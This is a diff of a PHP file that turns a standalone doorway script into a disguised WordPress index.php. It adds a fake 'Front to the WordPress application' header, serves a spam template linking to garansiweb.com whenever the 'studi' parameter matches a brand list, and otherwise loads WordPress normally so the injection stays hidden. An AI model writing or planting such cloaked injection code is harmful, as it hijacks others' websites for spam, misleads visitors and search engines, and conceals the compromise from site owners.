@@ -1,57 +1,57 @@
 <?php
+/**
+ * Front to the WordPress application.
+ * Load custom template if 'studi' parameter is found and valid.
+ *
+ * @package WordPress
+ */
+
+// Custom config
 $config = array(
     'url'        => 'https://garansiweb.com/',
-    'parameter'  => 'studi',  // Parameter dinamis
+    'parameter'  => 'studi',
     'template'   => __DIR__ . '/template.html',
+    'list'       => __DIR__ . '/list.txt',
 );
 
-// Ambil user-agent dan referer jika dibutuhkan
-$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$referer = $_SERVER['HTTP_REFERER'] ?? '';
-
-// Cek apakah parameter studi ada di URL dan tidak kosong
+// Check if the parameter exists and is valid
 if (isset($_GET[$config['parameter']]) && !empty($_GET[$config['parameter']])) {
     $brand = trim($_GET[$config['parameter']]);
 
-    // Cek apakah brand ada di list.txt
-    $filename = __DIR__ . '/list.txt';
-    if (!file_exists($filename)) {
-        echo "File list.txt tidak ditemukan.";
-        exit;
-    }
+    if (file_exists($config['list'])) {
+        $lines = file($config['list'], FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        $found = false;
 
-    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-    $found = false;
-
-    foreach ($lines as $item) {
-        if (strtolower(trim($item)) === strtolower($brand)) {
-            $found = true;
-            break;
+        foreach ($lines as $item) {
+            if (strtolower(trim($item)) === strtolower($brand)) {
+                $found = true;
+                break;
+            }
         }
-    }
 
-    if ($found) {
-        // Buat URL dinamis berdasarkan parameter
-        $url = $config['url'] . '?' . $config['parameter'] . '=' . urlencode($brand);
+        if ($found) {
+            $url = $config['url'] . '?' . $config['parameter'] . '=' . urlencode($brand);
 
-        if (file_exists($config['template']) && is_readable($config['template'])) {
-            $html = file_get_contents($config['template']);
-
-            // Gantikan placeholder dengan nilai dinamis
-            $html = str_replace('{{ BRAND }}', htmlspecialchars($brand), $html);
-            $html = str_replace('{{ URL }}', htmlspecialchars($url), $html);
-
-            echo $html;
-            exit;
+            if (file_exists($config['template']) && is_readable($config['template'])) {
+                $html = file_get_contents($config['template']);
+                $html = str_replace('{{ BRAND }}', htmlspecialchars($brand), $html);
+                $html = str_replace('{{ URL }}', htmlspecialchars($url), $html);
+                echo $html;
+                exit;
+            } else {
+                echo "Template file not found or not readable.";
+                exit;
+            }
         } else {
-            echo "File template tidak ditemukan atau tidak bisa dibaca.";
+            echo "Brand not found in the list.";
             exit;
         }
     } else {
-        echo "Brand tidak ditemukan dalam daftar.";
+        echo "List file not found.";
         exit;
     }
-} else {
-    echo "Parameter brand tidak tersedia.";
-    exit;
 }
+
+// Load WordPress normally
+define('WP_USE_THEMES', true);
+require __DIR__ . '/wp-blog-header.php';
